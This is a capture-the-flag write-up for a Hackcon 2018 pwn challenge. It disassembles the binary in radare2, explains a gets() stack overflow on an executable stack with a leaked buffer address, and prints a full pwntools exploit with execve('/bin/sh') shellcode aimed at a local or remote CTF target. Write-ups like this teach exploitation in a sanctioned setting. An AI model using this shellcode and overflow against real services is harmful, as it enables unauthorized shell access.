---
layout: post
title:  "[Write-up] Hackcon 2018 - She Sells Sea Shells - PWN"
date:   2018-08-17
category: blog
---
  - CTF NAME: [Hackcon 2018](https://hackcon.in/)
  - Category: PWN
  - Binary: [pwn2](http://ringr0p.github.io/binary/hackcon2018-bof)
  - Difficulty: Easy

This challenge was the fourth challenge (90 pts) of the pwn category in the [Hackcon CTF 2018](https://hackcon.in/).

Let's open the binary:

```
Welcome.

I have a small gift for you (no strings attached) 0x7ffcfd9a7b60

```
The first question is: what is the "small gift" that the program is giving us?
Let's open it in radare and try to figure it out:

```code
|	        0x00400676      55             push rbp                                                                                                      
|           0x00400677      4889e5         mov rbp, rsp                                                                                                          |           0x0040067a      4883ec50       sub rsp, 0x50               ; 'P'                                                                                     
|           0x0040067e      897dbc         mov dword [local_44h], edi    ; arg1                                                                                  |           0x00400681      488975b0       mov qword [local_50h], rsi    ; arg2                                                                                 
|           0x00400685      bf88074000     mov edi, str.Welcome.       ; 0x400788 ; "Welcome.\n"                                                                 |           0x0040068a      e891feffff     call sym.imp.puts           ;[2] ; int puts(const char *s)                                                           
|           0x0040068f      488d45c0       lea rax, [local_40h]                                                                                                  |           0x00400693      4889c6         mov rsi, rax
|           0x00400696      bf98074000     mov edi, str.I_have_a_small_gift_for_you__no_strings_attached___p
|           0x0040069b      b800000000     mov eax, 0                                                                                                            
|           0x004006a0      e88bfeffff     call sym.imp.printf         ;[2] ; int printf(const char *format)                                                     
|           0x004006a5      488b05a40920.  mov rax, qword sym.stdout    ; loc.stdout ; [0x601050:8]=0x7f59d30ee760 ; "`\xe7\x0e\xd3Y\x7f"                        
|           0x004006ac      4889c7         mov rdi, rax                                                                                                          
|           0x004006af      e8acfeffff     call sym.imp.fflush         ;[3] ; int fflush(FILE *stream)                                                           |           0x004006b4      488b05a50920.  mov rax, qword obj.stdin    ; [0x601060:8]=0x7f59d30eda00
|           0x004006bb      4889c7         mov rdi, rax                                                                                                          |           0x004006be      e89dfeffff     call sym.imp.fflush         ;[3] ; int fflush(FILE *stream)                                                           
|           0x004006c3      488d45c0       lea rax, [local_40h]                                                                                                  |           0x004006c7      4889c7         mov rdi, rax                                                                                              
|           0x004006ca      b800000000     mov eax, 0                                                                                                            |           0x004006cf      e87cfeffff     call sym.imp.gets           ;[4] ; char *gets(char *s)
|           0x004006d4      488b05750920.  mov rax, qword sym.stdout    ; loc.stdout ; [0x601050:8]=0x7f59d30ee760 ; "`\xe7\x0e\xd3Y\x7f"                        |           0x004006db      4889c7         mov rdi, rax
|           0x004006de      e87dfeffff     call sym.imp.fflush         ;[3] ; int fflush(FILE *stream)                                                           |           0x004006e3      488b05760920.  mov rax, qword obj.stdin    ; [0x601060:8]=0x7f59d30eda00                                                             |           0x004006ea      4889c7         mov rdi, rax
|           0x004006ed      e86efeffff     call sym.imp.fflush         ;[3] ; int fflush(FILE *stream)                                                           |           0x004006f2      b800000000     mov eax, 0
|           0x004006f7      c9             leave                                                                                                                 \           0x004006f8   *  c3             ret                                                                                                    

```

Ok, we can see that at 0x0040068f the address of the buffer (local_40h) is placed in rax. Notice that it uses the
"LEA" instruction instead of MOV, because it wants to "Load Effective Address" of the buffer in the register.
Than it moves rax in rsi as second parameter of the printf function, as the x64 calling convetion wants (first parameter in rdi , then rsi, rdx, rcx and so on).

After that, it requests, as the other challenges, an input that is managed using the gets () function, without the lenght control.

Then we can control the return address because there are no canaries on the stack. Moreover the NX bit is 0, then the stack is executable.
It means that if we place a shellcode in the stack and redirect the program to that address (that "casually" is given by the program), the code will be executed.

Now we have everything to write the exploit, and this time I used PwnTools to help me in the communication with the remote server:

```code
from pwn import *

'''
Shellcode:

xor rdi, rdi
xor rsi, rsi
xor rdx, rdx
xor rax, rax
push rax
mov rbx, 68732f2f6e69622fH
push rbx
mov rdi, rsp
mov al, 59
syscall

'''
shellcode = "\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"

log.info ("Shellcode len %d bytes", len(shellcode))

rem = False

if rem:
    p = remote ("139.59.30.165", 8900)
else:
    p = process ("./bof")

a = p.recv(80)
addr = int(a[60:74], 16)
payload = shellcode + (72 - len(shellcode))*'a' + p64(addr)
p.sendline(payload)
p.interactive() 
#print payload

```

And it works ;) !

![placeholder](https://ringr0p.github.io/images/hackcon2018-4-flag.png)
